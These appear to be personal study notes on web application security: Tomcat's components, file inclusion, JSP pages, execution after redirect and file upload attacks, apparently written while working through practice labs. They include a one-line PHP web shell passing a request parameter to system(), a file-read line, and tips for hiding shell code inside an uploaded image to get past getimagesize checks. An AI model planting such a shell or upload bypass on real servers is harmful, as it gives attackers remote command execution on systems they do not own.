# Apache Tomcat
Tomcat made up of three main components:

==Catalina== - Container of servlet Java. Implements Java Servlets and Javaserver Pages (JSP)
==Coyote== - HTTP connector of Tomcat. It supports the HTTP 1.1 protocol. It listens on a TCP port and communicates with the tomcat engine to process the request and send back the response to the client.
==Jasper== - compilation unit for JSP pages. It compiles the pages and sends them to CATALINA
==Tomcat== - Relies with the java environment that you have on the local system. This is done by checking an env variable named **JAVA_HOME** Another env variable is **TOMCAT_HOME**, which defines where you put tomcat in your local file system


# File Inclusion Attack
Its similar to directory transversal, however it also include code execution. The web page is running some type of computational code which is been dynamically updated by properties on the page.

![[Pasted image 20251128125205.png]]
![[Pasted image 20251128125215.png]]
- **Local File Inclusion** means the resources I'm trying to load are linked to the servers I'm attacking.
- **Remote File Inclusion** means the resources are being loaded from an external server, sometimes public facing. We are not loading the file from the OS system, but from the protocol itself, (ie:HTTP, FTP, SSH..) Also is possible its loading a resource from an attacker web server 
## Java Engine  - Files .jsp
==.jsp files== Are HTML files with imbedded JAVA code example, which use the java run time engine to interpret the code on them. [ref](https://youtu.be/ik2p4Rz4QzM?si=4HTx--jb9tTv4wu4&t=13309)
```java
<html>
<h1>Title </h1>
<p> Look, Im running Java Engine </p>

<% out.println("Hello World!"); %>
</html>
```

## Execution After Redirect
The code on the page will proceed to execute into the next steps, even after the user should have been re-directed. 
To make the code secure it should include an exit(1),after re-directing the user
![[Pasted image 20251128130109.png]]

### PHP Simple Shell
Save as command.php
Access it by website/command.php?cmd=ls -la
```php
<?php system($_REQUEST[cmd]); ?>
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
## File Upload

- Modify the content type that is being uploaded
- Some prevention code on php not very secure  is `getimagesize($tmpFile)`
	- it will check if image has widh x height, but we can bypass it by adding our shell code in the middle of the file
- We can put shell code in the middle of the upload file and still get RCE
	- We upload the malicious php shell code above, then we can access it by running
	- ==localhost:/uploads/thumbnail.php?cmd=ls -la==

- We can also upload files using ../ method to try for path transversal
  ![[Pasted image 20251129192002.png]]
- often time we need to `url encode` before sending it
- ![[Pasted image 20251129192142.png]]